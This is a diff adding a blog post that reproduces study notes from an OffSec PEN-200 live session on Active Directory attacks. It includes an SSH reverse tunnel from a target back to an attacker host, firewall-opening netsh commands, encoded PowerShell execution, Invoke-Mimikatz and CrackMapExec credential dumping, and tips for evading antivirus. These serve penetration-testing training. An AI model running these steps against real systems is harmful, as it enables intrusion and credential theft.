@@ -1,0 +1,64 @@
+---
+title: 'OffSec Live: PEN-200'
+date: 2022-08-31 12:00:00.000000000 Z
+layout: post-external
+original_link: https://cardboard-iguana.com/log/2022-08-31-offsec-live-pen-200.html
+author: 100007
+---
+
+<h1 id="offsec-live-pen-200">OffSec Live: PEN-200</h1>
+<p><strong>author:</strong> Nathan Acks<br />
+<strong>date:</strong> 2022-08-31</p>
+<h1 id="active-directory-enumeration--exploitation-part-3">Active Directory Enumeration &amp; Exploitation, Part 3</h1>
+<p>To use SSH as a generic SOCKS5 proxy, just use remote port forwarding.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># This command is run from the TARGET and connects back to the ATTACKER</span>
+<span class="c"># box. PORT on the ATTACKER box can then be used as a SOCKS5 proxy via</span>
+<span class="c"># proxychains, etc.</span>
+<span class="c">#</span>
+ssh <span class="nt">-R</span> <span class="nv">$PORT</span> <span class="nv">$USER</span>@<span class="nv">$ATTACKER</span>
+</code></pre></div></div>
+<p>To remember the difference between local and remote port forwarding, think of local port forwarding as connecting a port on the local machine to a remote service, while remote port forwarding connects a port on a remote machine to the local service - or SSH instance (if <em>only</em> a port is given)! Setting up SSH as a proxy doesn’t make sense in the context of the local port forwarding, but can make sense for remote port forwarding.</p>
+<p>(SSH port forwards are always read as <code class="language-plaintext highlighter-rouge">$FROM_MACHINE:$FROM_PORT:$TO_MACHINE:$TO_PORT</code>.)</p>
+<p>Check Windows Firewall state:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">netsh</span><span class="w"> </span><span class="nx">advfirewall</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">currentprofile</span><span class="w">
+</span></code></pre></div></div>
+<p>See all Windows Firewall rules for inbound connections:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">netsh</span><span class="w"> </span><span class="nx">advfirewall</span><span class="w"> </span><span class="nx">firewall</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">rule</span><span class="w"> </span><span class="nx">dir</span><span class="o">=</span><span class="kr">in</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="n">all</span><span class="w">
+</span></code></pre></div></div>
+<p>Be aware that most built-in rules on Windows are bound to particular applications. But admins are lazy, and seldom bind custom rules to explicit applications. There’s no 100% reliable way to identify such rules, but they’ll often have obvious naming conventions.</p>
+<p>See all Windows Firewall rules for outbound connections:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">netsh</span><span class="w"> </span><span class="nx">advfirewall</span><span class="w"> </span><span class="nx">firewall</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">rule</span><span class="w"> </span><span class="nx">dir</span><span class="o">=</span><span class="n">out</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="n">all</span><span class="w">
+</span></code></pre></div></div>
+<p>In general you don’t want to turn off the Windows Firewall, as doing so will generate a popup for any users currently logged into the machine.</p>
+<p>Punch a hole in the Windows Firewall for ports 80, 443, and 4444:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">netsh</span><span class="w"> </span><span class="nx">advfirewall</span><span class="w"> </span><span class="nx">firewall</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">action</span><span class="o">=</span><span class="n">allow</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="n">tunnel_in</span><span class="w"> </span><span class="se">`
+</span><span class="w"> </span><span class="nx">dir</span><span class="o">=</span><span class="kr">in</span><span class="w"> </span><span class="n">protocol</span><span class="o">=</span><span class="n">tcp</span><span class="w"> </span><span class="nx">localport</span><span class="o">=</span><span class="s2">"80,443,4444"</span><span class="w">
+</span><span class="n">netsh</span><span class="w"> </span><span class="nx">advfirewall</span><span class="w"> </span><span class="nx">firewall</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">action</span><span class="o">=</span><span class="n">allow</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="n">tunnel_out</span><span class="w"> </span><span class="se">`
+</span><span class="w"> </span><span class="nx">dir</span><span class="o">=</span><span class="n">out</span><span class="w"> </span><span class="nx">protocol</span><span class="o">=</span><span class="n">tcp</span><span class="w"> </span><span class="nx">localport</span><span class="o">=</span><span class="s2">"80,443,4444"</span><span class="w">
+</span></code></pre></div></div>
+<p>Encode a command to base64 in PowerShell:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$Text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$ONE_LINE_POWERSHELL_COMMAND</span><span class="s2">"</span><span class="w">
+</span><span class="nv">$Bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetBytes</span><span class="p">(</span><span class="nv">$Text</span><span class="p">)</span><span class="w">
+</span><span class="nv">$EncodedText</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$Bytes</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+<p>Run this using:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-enc</span><span class="w"> </span><span class="nv">$EncodedText</span><span class="w">
+</span></code></pre></div></div>
+<p>See logged in users with PowerView.ps1:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-NetLoggedon</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">UserName</span><span class="w">
+</span></code></pre></div></div>
+<p>Mimikatz binaries are generally detected by AV on download these days, but fortunately there’s a PowerShell reimplementation that can be run after bypassing AMSI.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">C:\mkat.txt</span><span class="w">
+</span></code></pre></div></div>
+<p>Note, however, that Microsoft Defender will still detect the execution of Invoke-Mimikatz and kill the hosting PowerShell process. This is why we need to redirect the output to a file.</p>
+<p>AV can also by bypassed using CrackMapExec:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb <span class="nv">$TARGET_NETWORK</span>/<span class="nv">$TARGET_NETMASK</span> <span class="se">\</span>
+<span class="nt">-u</span> <span class="nv">$TARGER_USER</span> <span class="nt">-p</span> <span class="nv">$CRACKED_PASSWORD</span> <span class="nt">--lsa</span> 2&gt; /dev/null
+</code></pre></div></div>
+<p>This only works if <code class="language-plaintext highlighter-rouge">$TARGET_USER</code> is an admin. If a user’s password is currently in memory, CrackMapExec will dump this as well (so then you don’t need to crack the hash!).</p>
+<ul>
+<li><a href="https://www.offensive-security.com/offsec/offsec-live/">OffSec Live</a></li>
+<li><a href="https://learn.offensive-security.com/offsec-live-webinars">Join OffSec Live</a></li>
+<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerShellMafia / PowerSploit / Recon / PowerView.ps1</a></li>
+<li><a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Mimikatz.ps1">EmpireProject / Empire / data / module_source / credentials / Invoke-Mimikatz.ps1</a></li>
+</ul>
